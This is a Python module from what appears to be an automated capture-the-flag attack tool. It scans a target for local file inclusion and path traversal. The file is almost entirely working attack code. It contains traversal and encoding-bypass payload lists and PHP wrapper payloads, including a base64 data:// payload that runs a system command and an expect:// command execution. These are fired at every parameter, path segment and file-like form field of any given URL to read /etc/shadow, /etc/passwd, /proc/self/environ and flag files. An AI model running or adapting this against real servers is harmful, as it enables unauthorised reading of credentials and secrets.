"""
LFI Module v2 — Local File Inclusion / Path Traversal
Aggressive flag extraction with PHP wrappers, encoding bypasses, and proc leaks.
"""
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter


FLAG_TARGETS = [
    "/flag", "/flag.txt", "/flag.php", "/flag.html",
    "/root/flag.txt", "/root/flag",
    "/home/ctf/flag.txt", "/home/user/flag.txt",
    "/var/www/html/flag.txt", "/app/flag.txt",
    "/tmp/flag.txt", "/opt/flag.txt",
    "/srv/flag.txt", "/challenge/flag.txt",
    "/etc/flag", "/flag.py",
]

SYSTEM_FILES = [
    "/etc/passwd", "/etc/hosts", "/etc/shadow",
    "/proc/self/environ", "/proc/1/environ",
    "/proc/self/cmdline", "/proc/version",
]

TRAVERSAL_PREFIXES = [
    "",
    "../../", "../../../", "../../../../", "../../../../../",
    "../../../../../../", "../../../../../../../",
    "....//....//....//", "....\\....\\....\\",
    "..%2F..%2F..%2F", "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "..%252F..%252F..%252F",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "..%c0%af..%c0%af..%c0%af",
    "....//....//....//....//",
]

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource={file}",
    "php://filter/read=string.rot13/resource={file}",
    "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcudHh0Jyk7ID8+",
    "expect://cat /flag.txt",
    "file://{file}",
    "zip://shell.jpg%23shell",
]

DETECT_SIGS = [
    "root:x:", "daemon:", "/bin/bash", "/bin/sh",
    "flag{", "FLAG{", "CTF{", "picoCTF{", "HTB{", "THM{",
    "[boot loader]", "Linux version",
]


class LFIModule(BaseModule):
    MODULE_NAME = "lfi"
    DESCRIPTION = "Local File Inclusion / Path Traversal"

    def run(self) -> dict:
        self.log(f"[LFI] Starting scan on {self.target_url}")
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Test every URL param
        for param in params:
            self.log(f"[LFI] Testing param: {param}")
            self._test_param(parsed, params, param)

        # Also try path-based LFI (common in Flask/PHP apps)
        self._test_path_lfi(parsed)

        # Test forms
        from backend.core.parser import Parser
        forms = Parser.extract_forms(resp.text)
        for form in forms:
            self._test_form(form)

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_param(self, parsed, params, param):
        from urllib.parse import urlencode, urlunparse

        # Try all flag targets with all traversal prefixes
        for target in FLAG_TARGETS + SYSTEM_FILES:
            for prefix in TRAVERSAL_PREFIXES:
                payload = prefix + target
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r is None:
                    continue
                if any(sig in r.text for sig in DETECT_SIGS):
                    self.add_vuln({"type": "lfi", "param": param, "payload": payload})
                    self.log(f"[LFI] FOUND! param={param} payload={payload}")
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
                    if flags:
                        return  # Got the flag, stop

        # PHP wrapper bypass
        for target in FLAG_TARGETS[:4]:
            for wrapper in PHP_WRAPPERS[:4]:
                payload = wrapper.replace("{file}", target)
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r is None:
                    continue
                import base64
                text = r.text
                # Try base64 decode if wrapper was base64-encode
                try:
                    decoded = base64.b64decode(text.strip()).decode("utf-8", errors="ignore")
                    flags = FlagHunter.hunt(decoded)
                    [self.add_flag(f) for f in flags]
                    if flags:
                        self.add_vuln({"type": "lfi_php_wrapper", "param": param,
                                       "payload": payload, "flags": flags})
                        self.log(f"[LFI] FLAG via PHP wrapper on param '{param}'!")
                        return
                except Exception:
                    pass
                flags = FlagHunter.hunt(text)
                [self.add_flag(f) for f in flags]

    def _test_path_lfi(self, parsed):
        """Test LFI via path manipulation for apps that use path params."""
        from urllib.parse import urlunparse
        base = f"{parsed.scheme}://{parsed.netloc}"
        path_segments = parsed.path.split("/")

        for i, seg in enumerate(path_segments):
            if not seg or seg in ("", "index.php", "index.html"):
                continue
            for target in FLAG_TARGETS[:6]:
                for prefix in TRAVERSAL_PREFIXES[:5]:
                    payload = prefix + target
                    new_path = "/".join(path_segments[:i] + [payload] + path_segments[i+1:])
                    url = base + new_path
                    r = self.requester.raw_get(url)
                    if r is None:
                        continue
                    if any(sig in r.text for sig in DETECT_SIGS):
                        flags = FlagHunter.hunt(r.text)
                        [self.add_flag(f) for f in flags]
                        self.add_vuln({"type": "lfi_path", "payload": payload, "url": url})
                        if flags:
                            return

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        for field in form["inputs"]:
            if field["type"] in ("submit", "button") or not field["name"]:
                continue
            name = (field.get("name") or "").lower()
            # Focus on file/path-like params
            if not any(kw in name for kw in ("file", "path", "page", "template",
                                              "include", "load", "read", "view",
                                              "name", "doc", "src", "url")):
                continue
            for target in FLAG_TARGETS[:5]:
                for prefix in TRAVERSAL_PREFIXES[:4]:
                    payload = prefix + target
                    data = {i["name"]: (payload if i["name"] == field["name"]
                                        else i["value"] or "test")
                            for i in form["inputs"] if i["name"]}
                    r = (self.requester.post(action, data=data)
                         if form["method"] == "POST"
                         else self.requester.get(action, params=data))
                    if r is None:
                        continue
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
                    if flags:
                        self.add_vuln({"type": "lfi_form", "field": field["name"],
                                       "payload": payload, "flags": flags})
                        return
